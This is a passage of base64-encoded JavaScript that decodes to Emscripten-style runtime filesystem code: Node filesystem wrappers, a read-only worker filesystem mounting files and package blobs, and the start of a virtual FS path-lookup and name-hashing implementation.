CB9CiAgICAgICAgfSksIHJlYWRkaXI6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgICAgIHZhciBwYXRoID0gTk9ERUZTLnJlYWxQYXRoKG5vZGUpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgcmV0dXJuIGZzLnJlYWRkaXJTeW5jKHBhdGgpCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgaWYoIWUuY29kZSkgdGhyb3cgZTsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pCiAgICAgICAgICAgIH0KICAgICAgICB9KSwgc3ltbGluazogKGZ1bmN0aW9uKHBhcmVudCwgbmV3TmFtZSwgb2xkUGF0aCkgewogICAgICAgICAgICB2YXIgbmV3UGF0aCA9IFBBVEguam9pbjIoTk9ERUZTLnJlYWxQYXRoKHBhcmVudCksIG5ld05hbWUpOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgZnMuc3ltbGlua1N5bmMob2xkUGF0aCwgbmV3UGF0aCkKICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICBpZighZS5jb2RlKSB0aHJvdyBlOwogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgIH0pLCByZWFkbGluazogKGZ1bmN0aW9uKG5vZGUpIHsKICAgICAgICAgICAgdmFyIHBhdGggPSBOT0RFRlMucmVhbFBhdGgobm9kZSk7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICBwYXRoID0gZnMucmVhZGxpbmtTeW5jKHBhdGgpOwogICAgICAgICAgICAgICAgcGF0aCA9IE5PREVKU19QQVRILnJlbGF0aXZlKE5PREVKU19QQVRILnJlc29sdmUobm9kZS5tb3VudC5vcHRzLnJvb3QpLCBwYXRoKTsKICAgICAgICAgICAgICAgIHJldHVybiBwYXRoCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgaWYoIWUuY29kZSkgdGhyb3cgZTsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pCiAgICAgICAgICAgIH0KICAgICAgICB9KQogICAgfSwKICAgIHN0cmVhbV9vcHM6IHsKICAgICAgICBvcGVuOiAoZnVuY3Rpb24oc3RyZWFtKSB7CiAgICAgICAgICAgIHZhciBwYXRoID0gTk9ERUZTLnJlYWxQYXRoKHN0cmVhbS5ub2RlKTsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmKEZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSkgewogICAgICAgICAgICAgICAgICAgIHN0cmVhbS5uZmQgPSBmcy5vcGVuU3luYyhwYXRoLCBOT0RFRlMuZmxhZ3NUb1Blcm1pc3Npb25TdHJpbmcoc3RyZWFtLmZsYWdzKSkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICBpZighZS5jb2RlKSB0aHJvdyBlOwogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgIH0pLCBjbG9zZTogKGZ1bmN0aW9uKHN0cmVhbSkgewogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgaWYoRlMuaXNGaWxlKHN0cmVhbS5ub2RlLm1vZGUpICYmIHN0cmVhbS5uZmQpIHsKICAgICAgICAgICAgICAgICAgICBmcy5jbG9zZVN5bmMoc3RyZWFtLm5mZCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICBpZighZS5jb2RlKSB0aHJvdyBlOwogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgIH0pLCByZWFkOiAoZnVuY3Rpb24oc3RyZWFtLCBidWZmZXIsIG9mZnNldCwgbGVuZ3RoLCBwb3NpdGlvbikgewogICAgICAgICAgICBpZihsZW5ndGggPT09IDApIHJldHVybiAwOwogICAgICAgICAgICB2YXIgbmJ1ZmZlciA9IG5ldyBCdWZmZXIobGVuZ3RoKTsKICAgICAgICAgICAgdmFyIHJlczsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIHJlcyA9IGZzLnJlYWRTeW5jKHN0cmVhbS5uZmQsIG5idWZmZXIsIDAsIGxlbmd0aCwgcG9zaXRpb24pCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgICAgICBpZihyZXMgPiAwKSB7CiAgICAgICAgICAgICAgICBmb3IodmFyIGkgPSAwOyBpIDwgcmVzOyBpKyspIHsKICAgICAgICAgICAgICAgICAgICBidWZmZXJbb2Zmc2V0ICsgaV0gPSBuYnVmZmVyW2ldCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgcmV0dXJuIHJlcwogICAgICAgIH0pLCB3cml0ZTogKGZ1bmN0aW9uKHN0cmVhbSwgYnVmZmVyLCBvZmZzZXQsIGxlbmd0aCwgcG9zaXRpb24pIHsKICAgICAgICAgICAgdmFyIG5idWZmZXIgPSBuZXcgQnVmZmVyKGJ1ZmZlci5zdWJhcnJheShvZmZzZXQsIG9mZnNldCArIGxlbmd0aCkpOwogICAgICAgICAgICB2YXIgcmVzOwogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgcmVzID0gZnMud3JpdGVTeW5jKHN0cmVhbS5uZmQsIG5idWZmZXIsIDAsIGxlbmd0aCwgcG9zaXRpb24pCiAgICAgICAgICAgIH0gY2F0Y2goZSkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVNbZS5jb2RlXSkKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gcmVzCiAgICAgICAgfSksIGxsc2VlazogKGZ1bmN0aW9uKHN0cmVhbSwgb2Zmc2V0LCB3aGVuY2UpIHsKICAgICAgICAgICAgdmFyIHBvc2l0aW9uID0gb2Zmc2V0OwogICAgICAgICAgICBpZih3aGVuY2UgPT09IDEpIHsKICAgICAgICAgICAgICAgIHBvc2l0aW9uICs9IHN0cmVhbS5wb3NpdGlvbgogICAgICAgICAgICB9IGVsc2UgaWYod2hlbmNlID09PSAyKSB7CiAgICAgICAgICAgICAgICBpZihGUy5pc0ZpbGUoc3RyZWFtLm5vZGUubW9kZSkpIHsKICAgICAgICAgICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgICAgICAgICB2YXIgc3RhdCA9IGZzLmZzdGF0U3luYyhzdHJlYW0ubmZkKTsKICAgICAgICAgICAgICAgICAgICAgICAgcG9zaXRpb24gKz0gc3RhdC5zaXplCiAgICAgICAgICAgICAgICAgICAgfSBjYXRjaChlKSB7CiAgICAgICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTW2UuY29kZV0pCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGlmKHBvc2l0aW9uIDwgMCkgewogICAgICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUlOVkFMKQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBwb3NpdGlvbgogICAgICAgIH0pCiAgICB9Cn07CnZhciBXT1JLRVJGUyA9IHsKICAgIERJUl9NT0RFOiAxNjg5NSwgRklMRV9NT0RFOiAzMzI3OSwgcmVhZGVyOiBudWxsLCBtb3VudDogKGZ1bmN0aW9uKG1vdW50KSB7CiAgICAgICAgYXNzZXJ0KEVOVklST05NRU5UX0lTX1dPUktFUik7CiAgICAgICAgaWYoIVdPUktFUkZTLnJlYWRlcikgV09SS0VSRlMucmVhZGVyID0gbmV3IEZpbGVSZWFkZXJTeW5jOwogICAgICAgIHZhciByb290ID0gV09SS0VSRlMuY3JlYXRlTm9kZShudWxsLCAiLyIsIFdPUktFUkZTLkRJUl9NT0RFLCAwKTsKICAgICAgICB2YXIgY3JlYXRlZFBhcmVudHMgPSB7fTsKCiAgICAgICAgZnVuY3Rpb24gZW5zdXJlUGFyZW50KHBhdGgpIHsKICAgICAgICAgICAgdmFyIHBhcnRzID0gcGF0aC5zcGxpdCgiLyIpOwogICAgICAgICAgICB2YXIgcGFyZW50ID0gcm9vdDsKICAgICAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IHBhcnRzLmxlbmd0aCAtIDE7IGkrKykgewogICAgICAgICAgICAgICAgdmFyIGN1cnIgPSBwYXJ0cy5zbGljZSgwLCBpICsgMSkuam9pbigiLyIpOwogICAgICAgICAgICAgICAgaWYoIWNyZWF0ZWRQYXJlbnRzW2N1cnJdKSB7CiAgICAgICAgICAgICAgICAgICAgY3JlYXRlZFBhcmVudHNbY3Vycl0gPSBXT1JLRVJGUy5jcmVhdGVOb2RlKHBhcmVudCwgcGFydHNbaV0sIFdPUktFUkZTLkRJUl9NT0RFLCAwKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgcGFyZW50ID0gY3JlYXRlZFBhcmVudHNbY3Vycl0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gcGFyZW50CiAgICAgICAgfQoKICAgICAgICBmdW5jdGlvbiBiYXNlKHBhdGgpIHsKICAgICAgICAgICAgdmFyIHBhcnRzID0gcGF0aC5zcGxpdCgiLyIpOwogICAgICAgICAgICByZXR1cm4gcGFydHNbcGFydHMubGVuZ3RoIC0gMV0KICAgICAgICB9CgogICAgICAgIEFycmF5LnByb3RvdHlwZS5mb3JFYWNoLmNhbGwobW91bnQub3B0c1siZmlsZXMiXSB8fCBbXSwgKGZ1bmN0aW9uKGZpbGUpIHsKICAgICAgICAgICAgV09SS0VSRlMuY3JlYXRlTm9kZShlbnN1cmVQYXJlbnQoZmlsZS5uYW1lKSwgYmFzZShmaWxlLm5hbWUpLCBXT1JLRVJGUy5GSUxFX01PREUsIDAsIGZpbGUsIGZpbGUubGFzdE1vZGlmaWVkRGF0ZSkKICAgICAgICB9KSk7CiAgICAgICAgKG1vdW50Lm9wdHNbImJsb2JzIl0gfHwgW10pLmZvckVhY2goKGZ1bmN0aW9uKG9iaikgewogICAgICAgICAgICBXT1JLRVJGUy5jcmVhdGVOb2RlKGVuc3VyZVBhcmVudChvYmpbIm5hbWUiXSksIGJhc2Uob2JqWyJuYW1lIl0pLCBXT1JLRVJGUy5GSUxFX01PREUsIDAsIG9ialsiZGF0YSJdKQogICAgICAgIH0pKTsKICAgICAgICAobW91bnQub3B0c1sicGFja2FnZXMiXSB8fCBbXSkuZm9yRWFjaCgoZnVuY3Rpb24ocGFjaykgewogICAgICAgICAgICBwYWNrWyJtZXRhZGF0YSJdLmZpbGVzLmZvckVhY2goKGZ1bmN0aW9uKGZpbGUpIHsKICAgICAgICAgICAgICAgIHZhciBuYW1lID0gZmlsZS5maWxlbmFtZS5zdWJzdHIoMSk7CiAgICAgICAgICAgICAgICBXT1JLRVJGUy5jcmVhdGVOb2RlKGVuc3VyZVBhcmVudChuYW1lKSwgYmFzZShuYW1lKSwgV09SS0VSRlMuRklMRV9NT0RFLCAwLCBwYWNrWyJibG9iIl0uc2xpY2UoZmlsZS5zdGFydCwgZmlsZS5lbmQpKQogICAgICAgICAgICB9KSkKICAgICAgICB9KSk7CiAgICAgICAgcmV0dXJuIHJvb3QKICAgIH0pLCBjcmVhdGVOb2RlOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBtb2RlLCBkZXYsIGNvbnRlbnRzLCBtdGltZSkgewogICAgICAgIHZhciBub2RlID0gRlMuY3JlYXRlTm9kZShwYXJlbnQsIG5hbWUsIG1vZGUpOwogICAgICAgIG5vZGUubW9kZSA9IG1vZGU7CiAgICAgICAgbm9kZS5ub2RlX29wcyA9IFdPUktFUkZTLm5vZGVfb3BzOwogICAgICAgIG5vZGUuc3RyZWFtX29wcyA9IFdPUktFUkZTLnN0cmVhbV9vcHM7CiAgICAgICAgbm9kZS50aW1lc3RhbXAgPSAobXRpbWUgfHwgbmV3IERhdGUpLmdldFRpbWUoKTsKICAgICAgICBhc3NlcnQoV09SS0VSRlMuRklMRV9NT0RFICE9PSBXT1JLRVJGUy5ESVJfTU9ERSk7CiAgICAgICAgaWYobW9kZSA9PT0gV09SS0VSRlMuRklMRV9NT0RFKSB7CiAgICAgICAgICAgIG5vZGUuc2l6ZSA9IGNvbnRlbnRzLnNpemU7CiAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSBjb250ZW50cwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIG5vZGUuc2l6ZSA9IDQwOTY7CiAgICAgICAgICAgIG5vZGUuY29udGVudHMgPSB7fQogICAgICAgIH0KICAgICAgICBpZihwYXJlbnQpIHsKICAgICAgICAgICAgcGFyZW50LmNvbnRlbnRzW25hbWVdID0gbm9kZQogICAgICAgIH0KICAgICAgICByZXR1cm4gbm9kZQogICAgfSksIG5vZGVfb3BzOiB7CiAgICAgICAgZ2V0YXR0cjogKGZ1bmN0aW9uKG5vZGUpIHsKICAgICAgICAgICAgcmV0dXJuIHsKICAgICAgICAgICAgICAgIGRldjogMSwKICAgICAgICAgICAgICAgIGlubzogdW5kZWZpbmVkLAogICAgICAgICAgICAgICAgbW9kZTogbm9kZS5tb2RlLAogICAgICAgICAgICAgICAgbmxpbms6IDEsCiAgICAgICAgICAgICAgICB1aWQ6IDAsCiAgICAgICAgICAgICAgICBnaWQ6IDAsCiAgICAgICAgICAgICAgICByZGV2OiB1bmRlZmluZWQsCiAgICAgICAgICAgICAgICBzaXplOiBub2RlLnNpemUsCiAgICAgICAgICAgICAgICBhdGltZTogbmV3IERhdGUobm9kZS50aW1lc3RhbXApLAogICAgICAgICAgICAgICAgbXRpbWU6IG5ldyBEYXRlKG5vZGUudGltZXN0YW1wKSwKICAgICAgICAgICAgICAgIGN0aW1lOiBuZXcgRGF0ZShub2RlLnRpbWVzdGFtcCksCiAgICAgICAgICAgICAgICBibGtzaXplOiA0MDk2LAogICAgICAgICAgICAgICAgYmxvY2tzOiBNYXRoLmNlaWwobm9kZS5zaXplIC8gNDA5NikKICAgICAgICAgICAgfQogICAgICAgIH0pLCBzZXRhdHRyOiAoZnVuY3Rpb24obm9kZSwgYXR0cikgewogICAgICAgICAgICBpZihhdHRyLm1vZGUgIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgbm9kZS5tb2RlID0gYXR0ci5tb2RlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoYXR0ci50aW1lc3RhbXAgIT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgbm9kZS50aW1lc3RhbXAgPSBhdHRyLnRpbWVzdGFtcAogICAgICAgICAgICB9CiAgICAgICAgfSksIGxvb2t1cDogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTk9FTlQpCiAgICAgICAgfSksIG1rbm9kOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lLCBtb2RlLCBkZXYpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pCiAgICAgICAgfSksIHJlbmFtZTogKGZ1bmN0aW9uKG9sZE5vZGUsIG5ld0RpciwgbmV3TmFtZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9KSwgdW5saW5rOiAoZnVuY3Rpb24ocGFyZW50LCBuYW1lKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVQRVJNKQogICAgICAgIH0pLCBybWRpcjogKGZ1bmN0aW9uKHBhcmVudCwgbmFtZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9KSwgcmVhZGRpcjogKGZ1bmN0aW9uKG5vZGUpIHsKICAgICAgICAgICAgdmFyIGVudHJpZXMgPSBbIi4iLCAiLi4iXTsKICAgICAgICAgICAgZm9yKHZhciBrZXkgaW4gbm9kZS5jb250ZW50cykgewogICAgICAgICAgICAgICAgaWYoIW5vZGUuY29udGVudHMuaGFzT3duUHJvcGVydHkoa2V5KSkgewogICAgICAgICAgICAgICAgICAgIGNvbnRpbnVlCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbnRyaWVzLnB1c2goa2V5KQogICAgICAgICAgICB9CiAgICAgICAgICAgIHJldHVybiBlbnRyaWVzCiAgICAgICAgfSksIHN5bWxpbms6IChmdW5jdGlvbihwYXJlbnQsIG5ld05hbWUsIG9sZFBhdGgpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRVBFUk0pCiAgICAgICAgfSksIHJlYWRsaW5rOiAoZnVuY3Rpb24obm9kZSkgewogICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FUEVSTSkKICAgICAgICB9KQogICAgfSwgc3RyZWFtX29wczogewogICAgICAgIHJlYWQ6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uKSB7CiAgICAgICAgICAgIGlmKHBvc2l0aW9uID49IHN0cmVhbS5ub2RlLnNpemUpIHJldHVybiAwOwogICAgICAgICAgICB2YXIgY2h1bmsgPSBzdHJlYW0ubm9kZS5jb250ZW50cy5zbGljZShwb3NpdGlvbiwgcG9zaXRpb24gKyBsZW5ndGgpOwogICAgICAgICAgICB2YXIgYWIgPSBXT1JLRVJGUy5yZWFkZXIucmVhZEFzQXJyYXlCdWZmZXIoY2h1bmspOwogICAgICAgICAgICBidWZmZXIuc2V0KG5ldyBVaW50OEFycmF5KGFiKSwgb2Zmc2V0KTsKICAgICAgICAgICAgcmV0dXJuIGNodW5rLnNpemUKICAgICAgICB9KSwgd3JpdGU6IChmdW5jdGlvbihzdHJlYW0sIGJ1ZmZlciwgb2Zmc2V0LCBsZW5ndGgsIHBvc2l0aW9uKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTykKICAgICAgICB9KSwgbGxzZWVrOiAoZnVuY3Rpb24oc3RyZWFtLCBvZmZzZXQsIHdoZW5jZSkgewogICAgICAgICAgICB2YXIgcG9zaXRpb24gPSBvZmZzZXQ7CiAgICAgICAgICAgIGlmKHdoZW5jZSA9PT0gMSkgewogICAgICAgICAgICAgICAgcG9zaXRpb24gKz0gc3RyZWFtLnBvc2l0aW9uCiAgICAgICAgICAgIH0gZWxzZSBpZih3aGVuY2UgPT09IDIpIHsKICAgICAgICAgICAgICAgIGlmKEZTLmlzRmlsZShzdHJlYW0ubm9kZS5tb2RlKSkgewogICAgICAgICAgICAgICAgICAgIHBvc2l0aW9uICs9IHN0cmVhbS5ub2RlLnNpemUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICBpZihwb3NpdGlvbiA8IDApIHsKICAgICAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKEVSUk5PX0NPREVTLkVJTlZBTCkKICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4gcG9zaXRpb24KICAgICAgICB9KQogICAgfQp9OwpTVEFUSUNUT1AgKz0gMTY7ClNUQVRJQ1RPUCArPSAxNjsKU1RBVElDVE9QICs9IDE2Owp2YXIgRlMgPSB7CiAgICByb290OiBudWxsLAogICAgbW91bnRzOiBbXSwKICAgIGRldmljZXM6IFtudWxsXSwKICAgIHN0cmVhbXM6IFtdLAogICAgbmV4dElub2RlOiAxLAogICAgbmFtZVRhYmxlOiBudWxsLAogICAgY3VycmVudFBhdGg6ICIvIiwKICAgIGluaXRpYWxpemVkOiBmYWxzZSwKICAgIGlnbm9yZVBlcm1pc3Npb25zOiB0cnVlLAogICAgdHJhY2tpbmdEZWxlZ2F0ZToge30sCiAgICB0cmFja2luZzoge29wZW5GbGFnczoge1JFQUQ6IDEsIFdSSVRFOiAyfX0sCiAgICBFcnJub0Vycm9yOiBudWxsLAogICAgZ2VuZXJpY0Vycm9yczoge30sCiAgICBmaWxlc3lzdGVtczogbnVsbCwKICAgIHN5bmNGU1JlcXVlc3RzOiAwLAogICAgaGFuZGxlRlNFcnJvcjogKGZ1bmN0aW9uKGUpIHsKICAgICAgICBpZighKGUgaW5zdGFuY2VvZiBGUy5FcnJub0Vycm9yKSkgdGhyb3cgZSArICIgOiAiICsgc3RhY2tUcmFjZSgpOwogICAgICAgIHJldHVybiBfX19zZXRFcnJObyhlLmVycm5vKQogICAgfSksCiAgICBsb29rdXBQYXRoOiAoZnVuY3Rpb24ocGF0aCwgb3B0cykgewogICAgICAgIHBhdGggPSBQQVRILnJlc29sdmUoRlMuY3dkKCksIHBhdGgpOwogICAgICAgIG9wdHMgPSBvcHRzIHx8IHt9OwogICAgICAgIGlmKCFwYXRoKSByZXR1cm4ge3BhdGg6ICIiLCBub2RlOiBudWxsfTsKICAgICAgICB2YXIgZGVmYXVsdHMgPSB7Zm9sbG93X21vdW50OiB0cnVlLCByZWN1cnNlX2NvdW50OiAwfTsKICAgICAgICBmb3IodmFyIGtleSBpbiBkZWZhdWx0cykgewogICAgICAgICAgICBpZihvcHRzW2tleV0gPT09IHVuZGVmaW5lZCkgewogICAgICAgICAgICAgICAgb3B0c1trZXldID0gZGVmYXVsdHNba2V5XQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmKG9wdHMucmVjdXJzZV9jb3VudCA+IDgpIHsKICAgICAgICAgICAgdGhyb3cgbmV3IEZTLkVycm5vRXJyb3IoRVJSTk9fQ09ERVMuRUxPT1ApCiAgICAgICAgfQogICAgICAgIHZhciBwYXJ0cyA9IFBBVEgubm9ybWFsaXplQXJyYXkocGF0aC5zcGxpdCgiLyIpLmZpbHRlcigoZnVuY3Rpb24ocCkgewogICAgICAgICAgICByZXR1cm4gISFwCiAgICAgICAgfSkpLCBmYWxzZSk7CiAgICAgICAgdmFyIGN1cnJlbnQgPSBGUy5yb290OwogICAgICAgIHZhciBjdXJyZW50X3BhdGggPSAiLyI7CiAgICAgICAgZm9yKHZhciBpID0gMDsgaSA8IHBhcnRzLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIHZhciBpc2xhc3QgPSBpID09PSBwYXJ0cy5sZW5ndGggLSAxOwogICAgICAgICAgICBpZihpc2xhc3QgJiYgb3B0cy5wYXJlbnQpIHsKICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIH0KICAgICAgICAgICAgY3VycmVudCA9IEZTLmxvb2t1cE5vZGUoY3VycmVudCwgcGFydHNbaV0pOwogICAgICAgICAgICBjdXJyZW50X3BhdGggPSBQQVRILmpvaW4yKGN1cnJlbnRfcGF0aCwgcGFydHNbaV0pOwogICAgICAgICAgICBpZihGUy5pc01vdW50cG9pbnQoY3VycmVudCkpIHsKICAgICAgICAgICAgICAgIGlmKCFpc2xhc3QgfHwgaXNsYXN0ICYmIG9wdHMuZm9sbG93X21vdW50KSB7CiAgICAgICAgICAgICAgICAgICAgY3VycmVudCA9IGN1cnJlbnQubW91bnRlZC5yb290CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYoIWlzbGFzdCB8fCBvcHRzLmZvbGxvdykgewogICAgICAgICAgICAgICAgdmFyIGNvdW50ID0gMDsKICAgICAgICAgICAgICAgIHdoaWxlKEZTLmlzTGluayhjdXJyZW50Lm1vZGUpKSB7CiAgICAgICAgICAgICAgICAgICAgdmFyIGxpbmsgPSBGUy5yZWFkbGluayhjdXJyZW50X3BhdGgpOwogICAgICAgICAgICAgICAgICAgIGN1cnJlbnRfcGF0aCA9IFBBVEgucmVzb2x2ZShQQVRILmRpcm5hbWUoY3VycmVudF9wYXRoKSwgbGluayk7CiAgICAgICAgICAgICAgICAgICAgdmFyIGxvb2t1cCA9IEZTLmxvb2t1cFBhdGgoY3VycmVudF9wYXRoLCB7cmVjdXJzZV9jb3VudDogb3B0cy5yZWN1cnNlX2NvdW50fSk7CiAgICAgICAgICAgICAgICAgICAgY3VycmVudCA9IGxvb2t1cC5ub2RlOwogICAgICAgICAgICAgICAgICAgIGlmKGNvdW50KysgPiA0MCkgewogICAgICAgICAgICAgICAgICAgICAgICB0aHJvdyBuZXcgRlMuRXJybm9FcnJvcihFUlJOT19DT0RFUy5FTE9PUCkKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgcmV0dXJuIHtwYXRoOiBjdXJyZW50X3BhdGgsIG5vZGU6IGN1cnJlbnR9CiAgICB9KSwKICAgIGdldFBhdGg6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgdmFyIHBhdGg7CiAgICAgICAgd2hpbGUodHJ1ZSkgewogICAgICAgICAgICBpZihGUy5pc1Jvb3Qobm9kZSkpIHsKICAgICAgICAgICAgICAgIHZhciBtb3VudCA9IG5vZGUubW91bnQubW91bnRwb2ludDsKICAgICAgICAgICAgICAgIGlmKCFwYXRoKSByZXR1cm4gbW91bnQ7CiAgICAgICAgICAgICAgICByZXR1cm4gbW91bnRbbW91bnQubGVuZ3RoIC0gMV0gIT09ICIvIiA/IG1vdW50ICsgIi8iICsgcGF0aCA6IG1vdW50ICsgcGF0aAogICAgICAgICAgICB9CiAgICAgICAgICAgIHBhdGggPSBwYXRoID8gbm9kZS5uYW1lICsgIi8iICsgcGF0aCA6IG5vZGUubmFtZTsKICAgICAgICAgICAgbm9kZSA9IG5vZGUucGFyZW50CiAgICAgICAgfQogICAgfSksCiAgICBoYXNoTmFtZTogKGZ1bmN0aW9uKHBhcmVudGlkLCBuYW1lKSB7CiAgICAgICAgdmFyIGhhc2ggPSAwOwogICAgICAgIGZvcih2YXIgaSA9IDA7IGkgPCBuYW1lLmxlbmd0aDsgaSsrKSB7CiAgICAgICAgICAgIGhhc2ggPSAoaGFzaCA8PCA1KSAtIGhhc2ggKyBuYW1lLmNoYXJDb2RlQXQoaSkgfCAwCiAgICAgICAgfQogICAgICAgIHJldHVybiAocGFyZW50aWQgKyBoYXNoID4+PiAwKSAlIEZTLm5hbWVUYWJsZS5sZW5ndGgKICAgIH0pLAogICAgaGFzaEFkZE5vZGU6IChmdW5jdGlvbihub2RlKSB7CiAgICAgICAgdmFyIGhhc2ggPSBGUy5oYXNoTmFtZShub2RlLnBhcmVudC5pZCwgbm9kZS5uYW1lKTsKICAgICAgICBub2RlLm5hbWVfbmV4dCA9IEZTLm5hbWVUYWJsZVtoYXNoXTsKICAgICAgICBGUy5uYW1lVGFibGVbaGFzaF0gPSBub2RlCiAgICB9KSwKICAgIGhhc2hSZW1vdmVOb2RlOiAoZnVuY3Rpb24obm9kZSkgewogICAgICAgIHZhciBoYXNoID0gRlMuaGFzaE5hbWUobm9kZS5wYXJlbnQuaWQsIG5vZGUubmFtZSk7CiAgICAgICAgaWYoRlMubmFtZVRhYmxlW2hhc2hdID09PSBub2RlKSB7CiAgICAgICAgICAgIEZTLm5hbWVUYWJsZVtoYXNoXSA9IG5vZGUubmFtZV9uZXh0CiAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgdmFyIGN1cnJlbnQgPSBGUy5uYW1lVGFibGVbaGFzaF07CiAgICAgICAgICAgIHdoaWxlKGN1cnJlbnQpIHsKICAgICAgICAgICAgICAgIGlmKGN1cnJlbnQubmFtZV9uZXh0ID09PSBub2RlKSB7CiAgICAgICAgICAgICAgICAgICAgY3VycmVudC5uYW1lX25leHQgPSBub2RlLm5hbWVfbmV4dDsKICAgICAgICAgICAgICAgICAgICBicmVhawogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgY3VycmVudCA9IGN1cnJlbnQubmFtZV9uZXh0CiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9KSwKICAgIGxvb2t1cE5vZGU6IChmdW5jdGlvbihwYXJlbnQsIG5hbWUpIHsKICAgICAgICB2YXIgZXJyID0gRlMubWF5TG9va3VwKHBhcmVudCk7CiAgICAgICAgaWYoZXJyKSB7CiAgICAgICAgICAgIHRocm93IG5ldyBGUy5FcnJub0Vycm9yKGVyciwgcGFyZW50KQogICAgICAgIH0KICAgICAgICB2YXIgaGFzaCA9IEZTLmhhc2hOYW1lKHBhcmVudC5pZCwgbmFtZSk7CiAgICAgICAgZm9yKHZhciBub2RlID0gRlMubmFtZVRhYmxlW2hhc2hdOyBub2RlOyBub2RlID0gbm9kZS5uYW1lX25leHQpIHsKICAgICAgICAgICAgdmFyIG5vZGVOYW1lID0gbm9kZS5uYW1lOwogICAgICAgICAgICBpZihub2RlLnBhcmVudC5pZCA9PT0gcGFyZW50LmlkICYm